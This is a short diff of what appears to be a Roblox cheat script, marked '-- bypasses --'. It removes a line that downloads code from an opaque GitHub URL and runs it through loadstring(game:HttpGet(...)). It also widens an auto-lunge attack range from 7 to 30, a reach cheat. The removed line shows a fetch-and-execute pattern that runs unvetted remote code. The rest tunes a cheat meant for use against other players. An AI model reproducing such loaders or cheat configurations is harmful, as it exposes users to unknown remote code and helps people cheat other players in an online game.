@@ -1,5 +1,4 @@
 -- bypasses -- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/fgza2/38502375934/refs/heads/main/%5E*)%24%23%26%240943"))()
 g = getgenv()
 
 
@@ -18,7 +17,7 @@ g.set = {
 
 		autoLunge = true,
 
-		lungeRange = 7
+		lungeRange = 30
 	}
 }
 ----------------------
